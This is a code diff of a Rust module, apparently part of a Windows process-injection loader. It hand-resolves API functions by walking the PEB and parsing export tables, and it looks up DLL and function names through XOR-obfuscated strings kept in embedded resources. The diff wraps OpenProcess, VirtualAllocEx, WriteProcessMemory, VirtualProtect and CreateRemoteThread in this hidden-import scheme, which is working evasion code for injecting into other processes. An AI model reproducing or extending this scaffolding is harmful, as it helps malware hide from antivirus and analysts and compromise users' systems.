@@ -4,7 +4,11 @@
 
 use crate::consts::*;
 use crate::crypto_util::*;
+use crate::util::{
+    compare_xor_c_str_and_c_str_bytes, compare_xor_c_str_and_w_str_bytes, get_resource_bytes, strlen,
+};
 #[cfg(test)]
+use crate::windows::apiset::API_SET_NAMESPACE_V6;
 use crate::windows::ntdll::*;
 use std::arch::global_asm;
 use std::ffi::{c_char, CStr, CString};
@@ -16,23 +20,25 @@ use std::{mem, slice};
 //KERNEL32.DLL
 pub type LoadLibraryA = unsafe extern "system" fn(lpLibFileName: *const u8) -> usize;
 pub type GetLastError = unsafe extern "system" fn() -> u32;
+pub type GetModuleHandleA = unsafe extern "system" fn(lpModuleName: *const u8) -> usize;
+pub type GetModuleHandleW = unsafe extern "system" fn(lwModuleName: *const u16) -> usize;
 pub type GetProcAddress = unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
 pub type FindResourceA =
-unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
+    unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
 pub type LoadResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> usize;
 pub type LockResource = unsafe extern "system" fn(hResData: usize) -> *const u8;
 pub type SizeofResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> u32;
 pub type CreateToolhelp32Snapshot =
-unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
+    unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
 pub type Process32First =
-unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
+    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
 pub type Process32Next =
-unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
+    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
 pub type CloseHandle = unsafe extern "system" fn(hObject: usize) -> bool;
 pub type OpenProcess =
-unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
+    unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
 pub type NtFlushInstructionCache =
-unsafe extern "system" fn(hProcess: usize, lpBaseAddress: usize, dwSize: u32);
+    unsafe extern "system" fn(hProcess: usize, lpBaseAddress: usize, dwSize: u32);
 pub type VirtualAllocEx = unsafe extern "system" fn(
     hProcess: usize,
     lpAddress: usize,
@@ -69,7 +75,7 @@ pub type CreateRemoteThread = unsafe extern "system" fn(
     lpThreadId: *mut u32,
 ) -> usize;
 pub type WaitForSingleObject =
-unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
+    unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
 
 pub type GetCurrentProcess = unsafe extern "system" fn() -> usize;
 
@@ -180,12 +186,6 @@ pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
     while addr_of!(*pListEntry) as usize != addr_of!(*pModuleList) as usize {
         let pEntry: &'static TRUNC_LDR_DATA_TABLE_ENTRY = mem::transmute(pListEntry);
 
-        // Debug code for printing out module names.
-        // print_buffer_as_string_utf16(
-        //     (*pEntry).BaseDllName.Buffer,
-        //     ((*pEntry).BaseDllName.Length / 2) as usize,
-        // );
-
         if &sModuleNameW[..]
             == std::slice::from_raw_parts(
                 pEntry.BaseDllName.Buffer,
@@ -200,16 +200,48 @@ pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
     0
 }
 
-pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
+pub unsafe fn GetModuleHandleX(xor_c_string: &[u8], key: &[u8]) -> usize {
+    let peb = get_peb();
+
+    if xor_c_string.is_empty() {
+        return peb.ImageBaseAddress;
+    }
+
+    let Ldr = peb.Ldr;
+    let pModuleList = &Ldr.InMemoryOrderModuleList;
+    let pStartListEntry = pModuleList.Flink;
+
+    let mut pListEntry = pStartListEntry;
+    while addr_of!(*pListEntry) as usize != addr_of!(*pModuleList) as usize {
+        let pEntry: &'static TRUNC_LDR_DATA_TABLE_ENTRY = mem::transmute(pListEntry);
+
+        let w_string = std::slice::from_raw_parts(
+            pEntry.BaseDllName.Buffer,
+            (pEntry.BaseDllName.Length / 2) as usize,
+        );
+        if compare_xor_c_str_and_w_str_bytes(xor_c_string, w_string, key, true) {
+            return pEntry.DllBase;
+        }
+        pListEntry = pListEntry.Flink;
+    }
+
+    0
+}
+
+pub unsafe fn GetProcAddressInternal(hMod: usize, sProcName: &[u8]) -> usize {
     let pBaseAddr = hMod;
     let pDosHdr: &'static IMAGE_DOS_HEADER = mem::transmute(pBaseAddr);
     let pNTHdr: &'static IMAGE_NT_HEADERS = mem::transmute(pBaseAddr + pDosHdr.e_lfanew as usize);
     let pOptionalHdr = &pNTHdr.OptionalHeader;
     let pExportDataDir = &pOptionalHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    let pExportDirAddr: &'static IMAGE_EXPORT_DIRECTORY = mem::transmute(pBaseAddr + pExportDataDir.VirtualAddress as usize);
+    let pExportDirAddr: &'static IMAGE_EXPORT_DIRECTORY =
+        mem::transmute(pBaseAddr + pExportDataDir.VirtualAddress as usize);
 
     let pEAT = pBaseAddr + pExportDirAddr.AddressOfFunctions as usize;
-    let sEATArray = std::slice::from_raw_parts(pEAT as *const u32, pExportDirAddr.NumberOfFunctions as usize);
+    let sEATArray = std::slice::from_raw_parts(
+        pEAT as *const u32,
+        pExportDirAddr.NumberOfFunctions as usize,
+    );
 
     let mut pProcAddr = 0;
     let dwOrdinalTest = *(sProcName.as_ptr() as *const u32);
@@ -224,8 +256,10 @@ pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
         pProcAddr = pBaseAddr + sEATArray[(ordinal - Base) as usize] as usize;
     } else {
         let pFuncNameTbl = pBaseAddr + pExportDirAddr.AddressOfNames as usize;
-        let sFuncNameTblArray =
-            std::slice::from_raw_parts(pFuncNameTbl as *const u32, pExportDirAddr.NumberOfNames as usize);
+        let sFuncNameTblArray = std::slice::from_raw_parts(
+            pFuncNameTbl as *const u32,
+            pExportDirAddr.NumberOfNames as usize,
+        );
 
         for i in 0..pExportDirAddr.NumberOfNames as usize {
             let string_ptr = pBaseAddr + sFuncNameTblArray[i] as usize;
@@ -237,8 +271,10 @@ pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
 
             if sProcName == c_string.to_bytes() {
                 let pHintsTbl = pBaseAddr + pExportDirAddr.AddressOfNameOrdinals as usize;
-                let sHintsTblArray =
-                    std::slice::from_raw_parts(pHintsTbl as *const u16, pExportDirAddr.NumberOfNames as usize);
+                let sHintsTblArray = std::slice::from_raw_parts(
+                    pHintsTbl as *const u16,
+                    pExportDirAddr.NumberOfNames as usize,
+                );
                 pProcAddr = pBaseAddr + sEATArray[sHintsTblArray[i] as usize] as usize;
             }
         }
@@ -263,89 +299,183 @@ pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
         }
 
         let sFwdFunction = CStr::from_ptr((pProcAddr + split_pos + 1) as *const c_char);
-        pProcAddr = GetProcAddress(hFwd, sFwdFunction.to_bytes());
+        pProcAddr = GetProcAddressInternal(hFwd, sFwdFunction.to_bytes());
     }
 
     pProcAddr
 }
 
+pub unsafe fn GetProcAddressX(pBaseAddr: usize, xor_c_string: &[u8], key: &[u8]) -> usize {
+    let pDosHdr: &'static IMAGE_DOS_HEADER = mem::transmute(pBaseAddr);
+    let pNTHdr: &'static IMAGE_NT_HEADERS = mem::transmute(pBaseAddr + pDosHdr.e_lfanew as usize);
+    let pOptionalHdr = &pNTHdr.OptionalHeader;
+    let pExportDataDir = &pOptionalHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    let pExportDirAddr: &'static IMAGE_EXPORT_DIRECTORY =
+        mem::transmute(pBaseAddr + pExportDataDir.VirtualAddress as usize);
+
+    let pEAT = pBaseAddr + pExportDirAddr.AddressOfFunctions as usize;
+    let sEATArray = std::slice::from_raw_parts(
+        pEAT as *const u32,
+        pExportDirAddr.NumberOfFunctions as usize,
+    );
+
+    // We are only loading by name for this function, so remove the ordinal code.
+    // checking for ordinal can cause false positives
+    let mut pProcAddr = 0;
+    let pFuncNameTbl = pBaseAddr + pExportDirAddr.AddressOfNames as usize;
+    let sFuncNameTblArray = std::slice::from_raw_parts(
+        pFuncNameTbl as *const u32,
+        pExportDirAddr.NumberOfNames as usize,
+    );
+
+    for i in 0..pExportDirAddr.NumberOfNames as usize {
+        let string_ptr = (pBaseAddr + sFuncNameTblArray[i] as usize) as *const u8;
+        let c_string = std::slice::from_raw_parts(string_ptr, strlen(string_ptr));
+
+        if compare_xor_c_str_and_c_str_bytes(xor_c_string, c_string, key, true) {
+            let pHintsTbl = pBaseAddr + pExportDirAddr.AddressOfNameOrdinals as usize;
+            let sHintsTblArray = std::slice::from_raw_parts(
+                pHintsTbl as *const u16,
+                pExportDirAddr.NumberOfNames as usize,
+            );
+            pProcAddr = pBaseAddr + sEATArray[sHintsTblArray[i] as usize] as usize;
+        }
+    }
+
+    if pProcAddr >= addr_of!(pExportDirAddr) as usize
+        && pProcAddr < addr_of!(pExportDirAddr) as usize + pExportDataDir.Size as usize
+    {
+        let mut sFwdDll = match CStr::from_ptr(pProcAddr as *const c_char).to_str() {
+            Ok(s) => s.to_string(),
+            Err(_) => return 0,
+        };
+        let split_pos = match sFwdDll.find(".") {
+            Some(s) => s,
+            None => return 0,
+        };
+        sFwdDll = sFwdDll.replace(".", "\0");
+
+        let hFwd = LoadLibraryA(sFwdDll.as_ptr());
+        if hFwd == 0 {
+            return 0;
+        }
+
+        let string_ptr = (pProcAddr + split_pos + 1) as *const u8;
+        let sFwdFunction = std::slice::from_raw_parts(string_ptr, strlen(string_ptr));
+        pProcAddr = GetProcAddressInternal(hFwd, sFwdFunction);
+    }
+
+    pProcAddr
+}
+
+pub unsafe fn GetModuleHandleA(lpModuleName: *const u8) -> usize {
+    let getModuleHandleA: GetModuleHandleA = std::mem::transmute(GetProcAddressInternal(
+        GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+        "GetModuleHandleA".as_bytes(),
+    ));
+
+    getModuleHandleA(lpModuleName)
+}
+
+pub unsafe fn GetModuleHandleW(lpModuleName: *const u16) -> usize {
+    let getModuleHandleW: GetModuleHandleW = std::mem::transmute(GetProcAddressInternal(
+        GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+        "GetModuleHandleW".as_bytes(),
+    ));
+
+    getModuleHandleW(lpModuleName)
+}
+
+pub unsafe fn GetProcAddress(hModule: usize, lpProcName: *const u8) -> usize {
+    let getProcAddress: GetProcAddress = std::mem::transmute(GetProcAddressInternal(
+        GetModuleHandle("KERNEL32.DLL".as_bytes().to_vec()),
+        "GetProcAddress".as_bytes(),
+    ));
+
+    getProcAddress(hModule, lpProcName)
+}
+
 pub unsafe fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize {
-    let openProcess: OpenProcess = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(OPENPROCESS_POS, OPENPROCESS_LEN).as_slice(),
+    let openProcess: OpenProcess = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, OPENPROCESS_POS, OPENPROCESS_LEN),
+        get_resource_bytes(RESOURCE_ID, OPENPROCESS_KEY, OPENPROCESS_LEN),
     ));
 
     openProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
 }
 
 pub unsafe fn CloseHandle(hObject: usize) -> bool {
-    let closeHandle: CloseHandle = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(CLOSEHANDLE_POS, CLOSEHANDLE_LEN).as_slice(),
+    let closeHandle: CloseHandle = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, CLOSEHANDLE_POS, CLOSEHANDLE_LEN),
+        get_resource_bytes(RESOURCE_ID, CLOSEHANDLE_KEY, CLOSEHANDLE_LEN),
     ));
 
     closeHandle(hObject)
 }
 
 pub unsafe fn LoadLibraryA(lpLibFileName: *const u8) -> usize {
-    let loadLibraryA: LoadLibraryA = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_xor_encrypted_string(LOADLIBRARYA_POS, LOADLIBRARYA_KEY, LOADLIBRARYA_LEN).as_slice(),
+    let loadLibraryA: LoadLibraryA = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, LOADLIBRARYA_POS, LOADLIBRARYA_LEN),
+        get_resource_bytes(RESOURCE_ID, LOADLIBRARYA_KEY, LOADLIBRARYA_LEN),
     ));
 
     loadLibraryA(lpLibFileName)
 }
 
 pub unsafe fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> usize {
-    let createToolhelp32Snapshot: CreateToolhelp32Snapshot = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(
+    let createToolhelp32Snapshot: CreateToolhelp32Snapshot = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(
+            RESOURCE_ID,
             CREATETOOLHELP32SNAPSHOT_POS,
             CREATETOOLHELP32SNAPSHOT_LEN,
-        )
-            .as_slice(),
+        ),
+        get_resource_bytes(
+            RESOURCE_ID,
+            CREATETOOLHELP32SNAPSHOT_KEY,
+            CREATETOOLHELP32SNAPSHOT_LEN,
+        ),
     ));
 
     createToolhelp32Snapshot(dwFlags, th32ProcessID)
 }
 
 pub unsafe fn Process32First(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool {
-    let process32First: Process32First = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(PROCESS32FIRST_POS, PROCESS32FIRST_LEN).as_slice(),
+    let process32First: Process32First = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, PROCESS32FIRST_POS, PROCESS32FIRST_LEN),
+        get_resource_bytes(RESOURCE_ID, PROCESS32FIRST_KEY, PROCESS32FIRST_LEN),
     ));
 
     process32First(hSnapshot, lppe)
 }
 
 pub unsafe fn Process32Next(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool {
-    let process32Next: Process32Next = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(PROCESS32NEXT_POS, PROCESS32NEXT_LEN).as_slice(),
+    let process32Next: Process32Next = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, PROCESS32NEXT_POS, PROCESS32NEXT_LEN),
+        get_resource_bytes(RESOURCE_ID, PROCESS32NEXT_KEY, PROCESS32NEXT_LEN),
     ));
 
     process32Next(hSnapshot, lppe)
@@ -357,13 +487,13 @@ pub unsafe fn VirtualAlloc(
     flAllocationType: u32,
     flProtect: u32,
 ) -> usize {
-    let virtualAlloc: VirtualAlloc = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(VIRTUALALLOC_POS, VIRTUALALLOC_LEN).as_slice(),
+    let virtualAlloc: VirtualAlloc = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, VIRTUALALLOC_POS, VIRTUALALLOC_LEN),
+        get_resource_bytes(RESOURCE_ID, VIRTUALALLOC_KEY, VIRTUALALLOC_LEN),
     ));
 
     virtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
@@ -376,13 +506,13 @@ pub unsafe fn VirtualAllocEx(
     flAllocationType: u32,
     flProtect: u32,
 ) -> usize {
-    let virtualAllocEx: VirtualAllocEx = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(VIRTUALALLOCEX_POS, VIRTUALALLOCEX_LEN).as_slice(),
+    let virtualAllocEx: VirtualAllocEx = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, VIRTUALALLOCEX_POS, VIRTUALALLOCEX_LEN),
+        get_resource_bytes(RESOURCE_ID, VIRTUALALLOCEX_KEY, VIRTUALALLOCEX_LEN),
     ));
 
     virtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
@@ -394,13 +524,13 @@ pub unsafe fn VirtualProtect(
     flNewProtect: u32,
     lpflOldProtect: *mut u32,
 ) -> bool {
-    let virtualProtect: VirtualProtect = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(VIRTUALPROTECT_POS, VIRTUALPROTECT_LEN).as_slice(),
+    let virtualProtect: VirtualProtect = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, VIRTUALPROTECT_POS, VIRTUALPROTECT_LEN),
+        get_resource_bytes(RESOURCE_ID, VIRTUALPROTECT_KEY, VIRTUALPROTECT_LEN),
     ));
 
     virtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
@@ -413,13 +543,13 @@ pub unsafe fn WriteProcessMemory(
     nSize: usize,
     lpNumberOfBytesWritten: usize,
 ) -> bool {
-    let writeProcessMemory: WriteProcessMemory = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(WRITEPROCESSMEMORY_POS, WRITEPROCESSMEMORY_LEN).as_slice(),
+    let writeProcessMemory: WriteProcessMemory = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, WRITEPROCESSMEMORY_POS, WRITEPROCESSMEMORY_LEN),
+        get_resource_bytes(RESOURCE_ID, WRITEPROCESSMEMORY_KEY, WRITEPROCESSMEMORY_LEN),
     ));
 
     writeProcessMemory(hProcess, lpAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
@@ -434,13 +564,13 @@ pub unsafe fn CreateRemoteThread(
     dwCreationFlags: u32,
     lpThreadId: *mut u32,
 ) -> usize {
-    let createRemoteThread: CreateRemoteThread = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(CREATEREMOTETHREAD_POS, CREATEREMOTETHREAD_LEN).as_slice(),
+    let createRemoteThread: CreateRemoteThread = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, CREATEREMOTETHREAD_POS, CREATEREMOTETHREAD_LEN),
+        get_resource_bytes(RESOURCE_ID, CREATEREMOTETHREAD_KEY, CREATEREMOTETHREAD_LEN),
     ));
 
     createRemoteThread(
@@ -455,40 +585,47 @@ pub unsafe fn CreateRemoteThread(
 }
 
 pub unsafe fn WaitForSingleObject(hProcess: usize, dwMilliseconds: u32) -> u32 {
-    let waitForSingleObject: WaitForSingleObject = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(WAITFORSINGLEOBJECT_POS, WAITFORSINGLEOBJECT_LEN)
-            .as_slice(),
+    let waitForSingleObject: WaitForSingleObject = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(
+            RESOURCE_ID,
+            WAITFORSINGLEOBJECT_POS,
+            WAITFORSINGLEOBJECT_LEN,
+        ),
+        get_resource_bytes(
+            RESOURCE_ID,
+            WAITFORSINGLEOBJECT_KEY,
+            WAITFORSINGLEOBJECT_LEN,
+        ),
     ));
 
     waitForSingleObject(hProcess, dwMilliseconds)
 }
 
 pub unsafe fn GetLastError() -> u32 {
-    let getLastError: GetLastError = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(GETLASTERROR_POS, GETLASTERROR_LEN).as_slice(),
+    let getLastError: GetLastError = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, GETLASTERROR_POS, GETLASTERROR_LEN),
+        get_resource_bytes(RESOURCE_ID, GETLASTERROR_KEY, GETLASTERROR_LEN),
     ));
 
     getLastError()
 }
 
 pub unsafe fn GetCurrentProcess() -> usize {
-    let getCurrentProcess: GetCurrentProcess = std::mem::transmute(GetProcAddress(
-        GetModuleHandle(get_xor_encrypted_string(
-            KERNEL32_DLL_POS,
-            KERNEL32_DLL_KEY,
-            KERNEL32_DLL_LEN,
-        )),
-        get_aes_encrypted_resource_bytes(GETCURRENTPROCESS_POS, GETCURRENTPROCESS_LEN).as_slice(),
+    let getCurrentProcess: GetCurrentProcess = std::mem::transmute(GetProcAddressX(
+        GetModuleHandleX(
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_POS, KERNEL32_DLL_LEN),
+            get_resource_bytes(RESOURCE_ID, KERNEL32_DLL_KEY, KERNEL32_DLL_LEN),
+        ),
+        get_resource_bytes(RESOURCE_ID, GETCURRENTPROCESS_POS, GETCURRENTPROCESS_LEN),
+        get_resource_bytes(RESOURCE_ID, GETCURRENTPROCESS_KEY, GETCURRENTPROCESS_LEN),
     ));
 
     getCurrentProcess()
